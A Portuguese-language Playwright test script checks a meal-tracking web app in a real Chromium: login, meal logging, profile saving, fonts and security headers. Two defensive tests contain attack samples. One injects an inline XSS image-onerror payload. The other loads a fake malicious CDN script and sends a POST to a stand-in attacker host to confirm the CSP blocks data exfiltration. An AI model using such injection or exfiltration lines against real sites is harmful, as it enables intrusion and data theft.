// Testes do ecrã num Chromium real, com a CSP e os cabeçalhos a sério.
//   node testes-ecra/correr.mjs
import { createRequire } from 'node:module';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
const require = createRequire(import.meta.url);
const { chromium } = require('/home/claude/.npm-global/lib/node_modules/playwright');
const AQUI = path.dirname(new URL(import.meta.url).pathname);
const RAIZ = process.env.RAIZ || path.resolve(AQUI, '..');
const PORTA = 8099, BASE = `http://127.0.0.1:${PORTA}/`;
const LIB = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.112.4/dist/umd/supabase.js';
const FALSO = fs.readFileSync(path.join(AQUI, 'falso-supabase.js'), 'utf8');

const srv = spawn(process.execPath, [path.join(AQUI, 'servidor.mjs'), RAIZ, String(PORTA)], { stdio: 'pipe' });
await new Promise(r => srv.stdout.once('data', r));
const browser = await chromium.launch();
const resultados = [];
const T = (nome, ok, obs = '') => resultados.push({ nome, ok: !!ok, obs });

async function abrir(url, cenario = {}) {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const externos = [];
  await ctx.route('**/*', (rota) => {
    const u = rota.request().url();
    if (u === LIB) return rota.fulfill({ contentType: 'text/javascript', body: FALSO });
    if (u.startsWith(BASE)) return rota.continue();
    externos.push(u); return rota.abort();
  });
  await ctx.addInitScript((c) => {
    window.__CENARIO__ = c; window.__VIOL__ = [];
    document.addEventListener('securitypolicyviolation', e => window.__VIOL__.push(e.violatedDirective + ' ← ' + (e.blockedURI || 'inline') + (e.sample ? ' [' + e.sample.slice(0, 40) + ']' : '')));
  }, cenario);
  const page = await ctx.newPage();
  const erros = [];
  page.on('pageerror', e => erros.push(String(e)));
  page.on('console', m => { if (m.type() === 'error') erros.push('consola: ' + m.text()); });
  await page.goto(BASE + url, { waitUntil: 'networkidle' });
  await page.waitForTimeout(400);
  return { ctx, page, erros, externos, viol: () => page.evaluate(() => window.__VIOL__) };
}
async function limpo(nome, a) {
  const v = await a.viol();
  T(nome + ' — sem violações da CSP', v.length === 0, v.join(' | '));
  T(nome + ' — sem erros de JavaScript', a.erros.length === 0, a.erros.join(' | ').slice(0, 300));
  T(nome + ' — sem pedidos a servidores de fora', a.externos.length === 0, a.externos.join(', '));
}

// E1 entrada sem sessão
{ const a = await abrir('index.html', { semSessao: true });
  T('E1 entrada mostra o botão do Google', await a.page.locator('#btn-entrar').isVisible());
  await a.page.click('#btn-entrar'); await a.page.waitForTimeout(300);
  T('E1 o botão chama o login do Google', await a.page.evaluate(() => window.__OAUTH__ === true));
  await limpo('E1', a); await a.ctx.close(); }

// E2 entrada com sessão aprovada → segue para o Hoje
{ const a = await abrir('index.html');
  await a.page.waitForURL(/hoje\.html/, { timeout: 5000 }).catch(() => {});
  T('E2 sessão aprovada segue para hoje.html', a.page.url().endsWith('hoje.html'), a.page.url());
  await limpo('E2', a); await a.ctx.close(); }

// E3 pessoa por aprovar fica na espera
{ const a = await abrir('index.html', { aprovado: false });
  T('E3 pessoa por aprovar vê a mensagem de espera', (await a.page.textContent('body')).includes('ainda não foi autorizada'));
  await limpo('E3', a); await a.ctx.close(); }

// E4 hoje: registar um almoço
{ const a = await abrir('hoje.html');
  await a.page.locator('#refeicoes button').filter({ hasText: /^Almoço/ }).click();
  await a.page.fill('#descricao', 'Massa com atum'); await a.page.fill('#kcal', '620');
  await a.page.click('#guardar'); await a.page.waitForTimeout(400);
  T('E4 o almoço fica registado', await a.page.locator('#itens').textContent().then(t => t.includes('Massa com atum')));
  await a.page.click('#fechar'); await a.page.waitForTimeout(200);
  T('E4 o total do dia mostra 620', (await a.page.textContent('#comido')).replace(/\D/g, '') === '620', await a.page.textContent('#comido'));
  await limpo('E4', a); await a.ctx.close(); }

// E5 perfil: preencher e guardar duas vezes no mesmo dia
{ const a = await abrir('perfil.html');
  await a.page.click('#sexo-f'); await a.page.fill('#nascimento', '1995-04-10');
  await a.page.fill('#altura', '165'); await a.page.fill('#peso', '68.4');
  await a.page.selectOption('#atividade', 'moderado'); await a.page.selectOption('#objetivo', '0.5');
  await a.page.click('#guardar'); await a.page.waitForTimeout(500);
  const msg1 = await a.page.textContent('#msg');
  T('E5 guardar o perfil funciona', msg1.includes('Guardado'), msg1);
  T('E5 o gasto aparece depois de guardar', (await a.page.textContent('#g-estimado')).includes('2169'));
  await a.page.fill('#peso', '68.1'); await a.page.click('#guardar'); await a.page.waitForTimeout(500);
  const msg2 = await a.page.textContent('#msg');
  T('E5 corrigir o peso no mesmo dia funciona', msg2.includes('Guardado'), msg2);
  const pedido = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'pesos' && p.modo === 'upsert').map(p => p.corpo));
  T('E5 o ecrã não envia utilizador_id no upsert', pedido.length === 2 && pedido.every(c => !('utilizador_id' in c)), JSON.stringify(pedido));
  await limpo('E5', a); await a.ctx.close(); }

// E6 a CSP trava um ataque por HTML injetado
{ const a = await abrir('hoje.html');
  await a.page.evaluate(() => { const d = document.createElement('div');
    d.innerHTML = '<img src="x" onerror="window.__XSS__ = 1">'; document.body.append(d); });
  await a.page.waitForTimeout(400);
  T('E6 código injetado num atributo NÃO corre', await a.page.evaluate(() => window.__XSS__ === undefined));
  const v = await a.viol();
  T('E6 e o browser regista a tentativa como violação', v.some(x => x.startsWith('script-src')), v.join(' | '));
  await a.ctx.close(); }

// E7 a CSP trava scripts de outros pacotes do mesmo CDN
{ const a = await abrir('hoje.html');
  const r = await a.page.evaluate(() => new Promise(ok => { const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/pacote-malicioso@1/x.js'; s.onload = () => ok('carregou'); s.onerror = () => ok('bloqueado');
    document.head.append(s); }));
  const v = await a.viol();
  T('E7 outro pacote do jsDelivr é bloqueado pela CSP', r === 'bloqueado' && v.some(x => x.includes('pacote-malicioso')), r + ' · ' + v.join(' | '));
  const f = await a.page.evaluate(() => fetch('https://exemplo-atacante.com/roubar', { method: 'POST', body: 'x' }).then(() => 'enviou').catch(() => 'bloqueado'));
  T('E7 enviar dados para outro servidor é bloqueado', f === 'bloqueado' && (await a.viol()).some(x => x.startsWith('connect-src')), f);
  await a.ctx.close(); }

// E8 fontes servidas pela app
{ const a = await abrir('hoje.html');
  const f = await a.page.evaluate(async () => { await document.fonts.ready;
    return ['IBM Plex Sans', 'Instrument Serif'].map(n => n + ':' + document.fonts.check(`16px "${n}"`)); });
  T('E8 as fontes carregam da própria app', f.every(x => x.endsWith('true')), f.join(', '));
  await a.ctx.close(); }

// E9 cabeçalhos que impedem a app de ser metida noutro site
{ const ctx = await browser.newContext(); const p = await ctx.newPage();
  const r = await p.goto(BASE + 'hoje.html'); const h = r.headers();
  T('E9 frame-ancestors none no cabeçalho', (h['content-security-policy'] || '').includes("frame-ancestors 'none'"));
  T('E9 X-Frame-Options DENY', h['x-frame-options'] === 'DENY');
  await ctx.close(); }

await browser.close(); srv.kill();
let falhas = 0;
for (const r of resultados) { if (!r.ok) falhas++; console.log((r.ok ? 'PASSA' : '>>> FALHA') + ' | ' + r.nome + (r.ok || !r.obs ? '' : ' | ' + r.obs)); }
console.log(`\nTOTAL ${resultados.length - falhas}/${resultados.length}`);
process.exit(falhas ? 1 : 0);
